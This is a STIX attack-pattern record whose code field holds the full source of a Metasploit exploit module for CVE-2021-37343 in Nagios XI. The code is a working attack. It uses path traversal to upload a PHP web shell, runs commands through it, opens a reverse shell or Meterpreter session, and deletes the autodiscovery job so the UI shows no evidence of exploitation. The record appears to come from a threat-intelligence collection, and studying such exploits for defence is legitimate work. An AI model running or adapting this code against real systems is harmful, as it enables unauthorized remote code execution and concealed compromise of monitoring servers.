{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ac83b677-6fd2-4faa-8514-15af26c3e572",
    "created": "2024-08-14T17:04:22.518551Z",
    "modified": "2024-08-14T17:04:22.518555Z",
    "name": "Nagios XI Autodiscovery Webshell Upload",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/nagios_xi_autodiscovery_webshell.rb",
            "external_id": "nagios_xi_autodiscovery_webshell.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-37343"
        },
        {
            "source_name": "reference",
            "url": "https://claroty.com/2021/09/21/blog-research-securing-network-management-systems-nagios-xi/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::NagiosXi\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Nagios XI Autodiscovery Webshell Upload',\n        'Description' => %q{\n          This module exploits a path traversal issue in Nagios XI before version 5.8.5 (CVE-2021-37343).\n          The path traversal allows a remote and authenticated administrator to upload a PHP web shell\n          and execute code as `www-data`. The module achieves this by creating an autodiscovery job\n          with an `id` field containing a path traversal to a writable and remotely accessible directory,\n          and `custom_ports` field containing the web shell. A cron file will be created using the chosen\n          path and file name, and the web shell is embedded in the file.\n\n          After the web shell has been written to the victim, this module will then use the web shell to\n          establish a Meterpreter session or a reverse shell. By default, the web shell is deleted by\n          the module, and the autodiscovery job is removed as well.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Claroty Team82', # vulnerability discovery\n          'jbaines-r7' # metasploit module\n        ],\n        'References' => [\n          ['CVE', '2021-37343'],\n          ['URL', 'https://claroty.com/2021/09/21/blog-research-securing-network-management-systems-nagios-xi/']\n        ],\n        'DisclosureDate' => '2021-07-15',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_openssl'\n              },\n              'Payload' => {\n                'Append' => ' & disown'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'printf' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true,\n          'MeterpreterTryToFork' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options [\n      OptString.new('USERNAME', [true, 'Username to authenticate with', 'nagiosadmin']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', nil]),\n      OptInt.new('DEPTH', [true, 'The depth of the path traversal', 10]),\n      OptString.new('WEBSHELL_NAME', [false, 'The name of the uploaded webshell. This value is random if left unset', nil]),\n      OptBool.new('DELETE_WEBSHELL', [true, 'Indicates if the webshell should be deleted or not.', true])\n    ]\n\n    @webshell_uri = '/includes/components/highcharts/exporting-server/temp/'\n    @webshell_path = '/usr/local/nagiosxi/html/includes/components/highcharts/exporting-server/temp/'\n  end\n\n  # Authenticate and grab the version from the dashboard. Store auth cookies for later user.\n  def check\n    auth_result, err_msg, @auth_cookies, @version = authenticate(datastore['USERNAME'], datastore['PASSWORD'], false, false, false)\n    case auth_result\n    when AUTH_RESULTS[:connection_failed]\n      return CheckCode::Unknown(err_msg)\n    when AUTH_RESULTS[:unexpected_error], AUTH_RESULTS[:not_fully_installed], AUTH_RESULTS[:failed_to_handle_license_agreement], AUTH_RESULTS[:failed_to_extract_tokens], AUTH_RESULTS[:unable_to_obtain_version]\n      return CheckCode::Detected(err_msg)\n    when AUTH_RESULTS[:not_nagios_application]\n      return CheckCode::Safe(err_msg)\n    end\n\n    # affected versions are 5.2.0 -> 5.8.4\n    if @version < Rex::Version.new('5.8.5') &&\n       @version >= Rex::Version.new('5.2.0')\n      return CheckCode::Appears(\"Determined using the self-reported version: #{@version.version}\")\n    end\n\n    CheckCode::Safe(\"Determined using the self-reported version: #{@version.version}\")\n  end\n\n  # Using the path traversal, upload a php webshell to the remote target\n  def drop_webshell\n    autodisc_uri = normalize_uri(target_uri.path, '/includes/components/autodiscovery/')\n    print_status(\"Attempting to grab a CSRF token from #{autodisc_uri}\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => autodisc_uri,\n      'cookie' => @auth_cookies,\n      'vars_get' => {\n        'mode' => 'newjob'\n      }\n    })\n\n    fail_with(Failure::Disconnected, 'Connection failed') unless res\n    fail_with(Failure::UnexpectedReply, \"Unexpected HTTP status code #{res.code}\") unless res.code == 200\n    fail_with(Failure::UnexpectedReply, 'Unexpected HTTP body') unless res.body.include?('<title>New Auto-Discovery Job')\n\n    # snag the nsp token from the response\n    nsp = get_nsp(res)\n    fail_with(Failure::Unknown, 'Failed to obtain the nsp token which is required to upload the web shell') if nsp.blank?\n\n    # drop a basic web shell on the server\n    webshell_location = normalize_uri(target_uri.path, \"#{@webshell_uri}#{@webshell_name}\")\n    print_status(\"Uploading webshell to #{webshell_location}\")\n    php_webshell = '<?php if(isset($_GET[\"cmd\"])) { system($_GET[\"cmd\"]); } ?>'\n    payload = 'update=1&' \\\n      \"job=#{'../' * datastore['DEPTH']}#{@webshell_path}#{@webshell_name}&\" \\\n      \"nsp=#{nsp}&\" \\\n      'address=127.0.0.1%2F0&' \\\n      'frequency=Yearly&' \\\n      \"custom_ports=#{php_webshell}&\"\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => autodisc_uri,\n      'cookie' => @auth_cookies,\n      'vars_get' => {\n        'mode' => 'newjob'\n      },\n      'data' => payload\n    })\n\n    fail_with(Failure::Disconnected, 'Connection failed') unless res\n    fail_with(Failure::UnexpectedReply, \"Unexpected HTTP status code #{res.code}\") unless res.code == 302\n\n    # Test the web shell installed by echoing a random string and ensure it appears in the res.body\n    print_status('Testing if web shell installation was successful')\n    rand_data = Rex::Text.rand_text_alphanumeric(16..32)\n    res = execute_via_webshell(\"echo #{rand_data}\")\n    fail_with(Failure::UnexpectedReply, 'Web shell execution did not appear to succeed.') unless res.body.include?(rand_data)\n    print_good(\"Web shell installed at #{webshell_location}\")\n\n    # This is a great place to leave a web shell for persistence since it doesn't require auth\n    # to touch it. By default, we'll clean this up but the attacker has to option to leave it\n    if datastore['DELETE_WEBSHELL']\n      register_file_for_cleanup(\"#{@webshell_path}#{@webshell_name}\")\n    end\n  end\n\n  # Successful exploitation creates a new job in the autodiscovery view. This function deletes\n  # the job that there is no evidence of exploitation in the UI.\n  def cleanup_job\n    print_status('Deleting autodiscovery job')\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/includes/components/autodiscovery/'),\n      'cookie' => @auth_cookies,\n      'vars_get' => {\n        'mode' => 'deletejob',\n        'job' => \"#{'../' * datastore['DEPTH']}#{@webshell_path}#{@webshell_name}\"\n      }\n    })\n\n    fail_with(Failure::Disconnected, 'Connection failed') unless res\n    fail_with(Failure::UnexpectedReply, \"Unexpected HTTP status code #{res.code}\") unless res&.code == 302\n  end\n\n  # Executes commands via the uploaded webshell\n  def execute_via_webshell(cmd)\n    cmd = Rex::Text.uri_encode(cmd)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, \"/includes/components/highcharts/exporting-server/temp/#{@webshell_name}?cmd=#{cmd}\")\n    })\n\n    fail_with(Failure::Disconnected, 'Connection failed') unless res\n    fail_with(Failure::UnexpectedReply, \"Unexpected HTTP status code #{res.code}\") unless res.code == 200\n    res\n  end\n\n  def execute_command(cmd, _opts = {})\n    execute_via_webshell(cmd)\n  end\n\n  def exploit\n    # create a randomish web shell name if the user doesn't specify one\n    @webshell_name = datastore['WEBSHELL_NAME'] || \"#{Rex::Text.rand_text_alpha(5..12)}.php\"\n    unless @auth_cookies.present?\n      auth_result, err_msg, @auth_cookies, @version = authenticate(datastore['USERNAME'], datastore['PASSWORD'], false, false, false)\n      case auth_result\n      when AUTH_RESULTS[:connection_failed]\n        return CheckCode::Unknown(err_msg)\n      when AUTH_RESULTS[:unexpected_error], AUTH_RESULTS[:not_fully_installed], AUTH_RESULTS[:failed_to_handle_license_agreement], AUTH_RESULTS[:failed_to_extract_tokens], AUTH_RESULTS[:unable_to_obtain_version]\n        return CheckCode::Detected(err_msg)\n      when AUTH_RESULTS[:not_nagios_application]\n        return CheckCode::Safe(err_msg)\n      end\n    end\n\n    drop_webshell\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  ensure\n    cleanup_job\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-07-15",
    "x_mitre_platforms": [
        "linux'"
    ]
}